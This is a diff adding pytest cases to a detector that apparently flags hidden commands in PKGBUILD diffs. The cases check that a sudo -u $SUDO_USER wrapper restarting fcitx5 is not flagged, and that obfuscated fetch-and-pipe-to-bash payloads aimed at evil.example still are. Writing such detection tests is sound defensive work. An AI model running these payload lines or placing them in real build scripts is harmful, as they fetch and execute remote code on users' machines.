@@ -165,6 +165,58 @@ def test_x002_still_fires_on_an_unresolved_splice():
     assert "X002" in set(crossfire_techniques(diff))
 
 
+def test_x002_stands_down_for_the_sudo_user_wrapper_argument():
+    """`sudo -u $SUDO_USER env … fcitx5` names `fcitx5` in plain text.
+
+    clak's post_install restarts the user's fcitx5: `sudo -u $SUDO_USER env
+    XDG_RUNTIME_DIR=… DBUS_SESSION_BUS_ADDRESS=unix:path=… fcitx5 -r -d`.
+    The de-escalation `$SUDO_USER` is an *argument* to the `sudo` wrapper,
+    not a command name; the real command (`fcitx5`) is spelled out at the
+    end. This pinned X002 CRITICAL until the wrapper's own arguments were
+    skipped.
+    """
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n post_install() {\n"
+        "+  sudo -u $SUDO_USER env XDG_RUNTIME_DIR=/run/user/${user_uid}"
+        " DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/${user_uid}/bus fcitx5 -r -d\n"
+        " }\n"
+    )
+    assert "X002" not in set(crossfire_techniques(diff))
+
+
+def test_x002_still_sees_a_payload_after_a_sudo_user_wrapper():
+    """The stand-down is the *argument*, not the whole line: a real hidden
+    command later on the same line still fires."""
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n post_install() {\n"
+        "+  sudo -u $SUDO_USER env X=1 ${A[0]} https://evil.example | bash\n"
+        " }\n"
+    )
+    assert "X002" in set(crossfire_techniques(diff))
+
+
+@pytest.mark.parametrize("command", [
+    'sudo -u alice ${A[0]} https://evil.example',
+    'sudo -u $SUDO_USER ${A[0]} https://evil.example',
+    'sudo --user=${A[0]} https://evil.example',
+    'sudo --user=root ${A[0]} https://evil.example',
+])
+def test_x002_still_sees_a_payload_after_an_account_option(command):
+    """The privilege target is skipped; a hidden command after it is not."""
+    assert "X002" in _fire(command)
+
+
+@pytest.mark.parametrize("command", [
+    'sudo --user=$SUDO_USER env fcitx5',
+    'sudo --user=${SUDO_USER} env fcitx5',
+    'sudo -u root env X=1 fcitx5',
+    'doas -u $SUDO_USER env fcitx5',
+])
+def test_x002_stands_down_for_a_dynamic_account_target(command):
+    """The de-escalation target names an account, not a command."""
+    assert "X002" not in _fire(command)
+
+
 @pytest.mark.parametrize("spelling", [
     '"$_system_wasm_bindgen"',   # ruffle-nightly
     '"${_client}"',              # securelink
